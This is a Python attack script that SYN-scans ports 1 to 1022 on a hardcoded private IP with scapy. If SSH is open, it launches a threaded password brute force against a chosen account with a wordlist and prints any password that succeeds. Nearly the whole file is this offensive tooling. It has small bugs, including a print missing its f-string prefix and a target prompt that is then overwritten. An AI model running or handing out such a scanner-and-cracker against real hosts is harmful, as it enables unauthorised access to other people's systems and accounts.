from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import paramiko, sys, os, termcolor
import threading, time

# Config
timeout_half_sec = 0.5
timeout_two_sec = 2
timeout_three_sec = 3
TCP_SYN_FLAG = 'S'
TCP_RST_FLAG = 'R'

stop_flag = 0

target = input("Please add target: ")
target = "192.168.50.134"
registered_Ports = range(1,1023)
open_ports = []


def scan_port(dst_port):
    source_port = RandShort()
    conf.verb = 0

    pkt = IP(dst=target) / TCP(sport=source_port, dport=dst_port, flags=TCP_SYN_FLAG)
    syn_pkt = sr1(pkt, timeout=timeout_half_sec)

    if syn_pkt is None:
        return False
    elif not syn_pkt.haslayer(TCP):
        return False
    elif syn_pkt.haslayer(TCP):
        var = syn_pkt[TCP].flags & 0x10 == 0x10

    pkt = IP(dst=target) / TCP(sport=source_port, dport=dst_port, flags=TCP_RST_FLAG)
    sr(pkt, timeout=timeout_half_sec)

    return True


def target_availability_check(scan_host):
    try:
        conf.verb = 0
        pingr = IP(dst=scan_host) / ICMP()
        res = sr1(pingr, timeout=timeout_three_sec)
        if res is not None:
            return True
    except Exception as inst:
        print(inst)
        return False


def ssh_connect(password, port_number):
    global stop_flag
    ssh_conn = paramiko.SSHClient()
    ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_conn.connect(host, port=port_number, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Success Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Nop Login: ' + password), 'red'))
    ssh_conn.close()


def brut_force(port):
    with open(input_file, 'r') as file:
        for line in file.readlines():
            if stop_flag == 1:
                t.join()
                exit()
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(password,port))
            t.start()
            time.sleep(1)


if target_availability_check(target):
    for i in registered_Ports:
        status = scan_port(i)
        if status:
            print("Open port {i}")
            open_ports.append(i)
print(open_ports)
print("Scan finished")


if 22 in open_ports:
    user_input = input('Do you want to atak ssh (yes/no): ')
    yes_choices = ['yes', 'y']
    no_choices = ['no', 'n']
    if user_input.lower() in yes_choices:
        host = input('[+] Target Address: ')
        username = input('[+] SSH Username: ')
        input_file = input('[+] Passwords File: ')
        input_file = "pass/" + input_file
        print('\n')

        if os.path.exists(input_file) == False:
            print('[!!] That File/Path Does Not Exist')
            sys.exit(1)

        print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' * * *')
        brut_force(22)
    elif user_input.lower() in no_choices:
        print('user typed no')
    else:
        print('Type yes or no')






